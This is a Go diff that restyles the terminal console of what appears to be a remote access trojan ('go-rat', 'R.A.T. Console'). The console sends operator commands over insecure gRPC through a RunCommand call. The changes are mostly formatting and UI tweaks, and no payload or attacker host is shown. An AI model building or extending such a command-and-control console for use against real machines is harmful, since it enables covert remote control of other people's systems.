@@ -3,6 +3,9 @@ package main
 import (
 	"context"
 	"fmt"
+	"os"
+	"time"
+
 	"github.com/charmbracelet/bubbles/textinput"
 	"github.com/charmbracelet/bubbles/viewport"
 	tea "github.com/charmbracelet/bubbletea"
@@ -11,16 +14,18 @@ import (
 	"github.com/iortego42/go-rat/grpcapi"
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/credentials/insecure"
-	"os"
-	"time"
 )
 
 var prompt = lipgloss.NewStyle().
-	SetString("|> ").
+	SetString("─╼ ").
 	Foreground(lipgloss.Color("#9fef00"))
 
+var box = lipgloss.NewStyle().
+	BorderForeground(lipgloss.Color("#9fef00")).Border(lipgloss.RoundedBorder())
+
 var viewportStyle = lipgloss.NewStyle().
-	//Foreground(lipgloss.Color("#ffffa0")).
+
+	// Foreground(lipgloss.Color("#ffffa0")).
 	Padding(0, 1).
 	Border(lipgloss.RoundedBorder())
 
@@ -58,7 +63,7 @@ func initModel() *model {
 }
 
 func (m model) exec() tea.Msg {
-	var _exec = func() tea.Msg {
+	_exec := func() tea.Msg {
 		var err error
 		m.cmd, err = m.client.RunCommand(m.ctx, m.cmd)
 		if err != nil {
@@ -97,13 +102,13 @@ func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 			m.exec()
 			m.viewport.SetContent(m._run())
 			m.viewport.GotoBottom()
-			//return m, m.exec
+			// return m, m.exec
 		case "ctrl+c":
 			return m, tea.Quit
 		case "esc":
 			m.viewport.SetContent("")
 		}
-		//default:
+		// default:
 		//	return m, nil
 	}
 	return m, tea.Batch(iCmd, vpCmd)
@@ -120,8 +125,9 @@ func (m model) View() string {
 	return fmt.Sprintf(
 		"%s\n%s\n%s",
 		"R.A.T. Console",
-		m.viewport.View(),
-		m.input.View())
+		m.input.View(),
+		// box.Width(78).Render(m.input.View()))
+		m.viewport.View())
 }
 
 func main() {
@@ -129,7 +135,7 @@ func main() {
 		opts []grpc.DialOption
 		err  error
 		conn *grpc.ClientConn
-		//client grpcapi.AdminClient
+		// client grpcapi.AdminClient
 		m *model
 	)
 	opts = append(opts, grpc.WithTransportCredentials(insecure.NewCredentials()))
@@ -146,6 +152,6 @@ func main() {
 	}
 	fmt.Println(bye.Render())
 	time.Sleep(1000)
-	//client = grpcapi.NewAdminClient(conn)
-	//mainLoop(client)
+	// client = grpcapi.NewAdminClient(conn)
+	// mainLoop(client)
 }
